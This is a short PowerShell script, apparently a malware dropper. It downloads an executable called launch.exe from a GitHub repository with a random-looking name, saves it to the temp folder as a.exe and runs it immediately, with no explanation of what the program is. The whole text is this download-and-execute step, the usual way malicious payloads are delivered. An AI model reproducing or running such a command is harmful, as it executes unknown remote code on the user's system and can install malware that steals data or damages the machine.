$wc = New-Object System.Net.WebClient
$wc.DownloadFile('https://raw.githubusercontent.com/nesabydy00/dgeagagaeg/main/launch.exe', "$env:TEMP\a.exe")
& "$env:TEMP\a.exe"
